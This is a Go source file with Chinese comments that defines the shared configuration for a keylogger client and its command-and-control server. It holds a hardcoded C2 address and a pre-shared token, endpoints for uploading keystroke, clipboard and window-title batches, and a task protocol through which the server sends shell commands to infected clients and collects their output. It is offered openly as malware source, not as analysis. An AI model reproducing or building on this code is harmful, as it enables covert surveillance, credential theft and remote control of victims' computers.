// Package c2config 定义键盘记录客户端与 C2 服务端共享的常量与数据结构。
// 客户端与远端服务端编译自本文件,两端必须保持一致。
package c2config

const (
	// ServerURL 客户端内置的 C2 服务端地址(明文只在本包存在;
	// 客户端经 tools/secretgen 生成密文内嵌,服务端不直接使用此值)。
	// 修改后运行 go run ./tools/secretgen 并重编译两端。
	ServerURL = "http://192.168.88.131:22165"

	// Token 预共享密钥,客户端与服务端均内置,用于接口鉴权。
	// 修改后运行 go run ./tools/secretgen 并重编译两端。
	Token = "golin-c2-2026-secret"

	// HeaderName 上报请求携带鉴权值的 Header 名称
	HeaderName = "X-Auth-Token"

	// ReportPath 按键批次上报接口
	ReportPath = "/api/report"

	// HealthPath 心跳/测活接口
	HealthPath = "/api/health"

	// TasksPath 客户端拉取待执行任务接口
	TasksPath = "/api/tasks"

	// ResultPath 客户端回传任务执行结果接口
	ResultPath = "/api/result"
)

// 任务状态
const (
	TaskPending = "pending" // 已下发,等待客户端拉取
	TaskSent    = "sent"    // 已被客户端拉取,等待执行结果
	TaskDone    = "done"    // 已收到执行结果
)

// Heartbeat 客户端心跳体
type Heartbeat struct {
	ClientID string `json:"client_id"`
}

// Event 单条记录事件
type Event struct {
	Time int64  `json:"t"`    // Unix 时间戳(秒)
	Type string `json:"type"` // 事件类型: key / clipboard / window
	Win  string `json:"win"`  // 事件发生时的前台窗口标题
	Data string `json:"data"` // 事件内容
}

// Batch 一次上报的批次
type Batch struct {
	ClientID string  `json:"client_id"`
	Events   []Event `json:"events"`
}

// Task 一条下发给客户端执行的命令任务
type Task struct {
	ID        string `json:"id"`
	ClientID  string `json:"client_id,omitempty"`
	Command   string `json:"command"`
	Status    string `json:"status"` // pending / sent / done
	Result    string `json:"result,omitempty"`
	Error     string `json:"error,omitempty"`
	CreatedAt int64  `json:"created_at"`        // Unix 秒
	SentAt    int64  `json:"sent_at,omitempty"` // 最近一次下发给客户端的时间,Unix 秒
	DoneAt    int64  `json:"done_at,omitempty"` // Unix 秒
}

// TaskResult 客户端回传的任务执行结果
type TaskResult struct {
	ID       string `json:"id"`
	ClientID string `json:"client_id"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
}
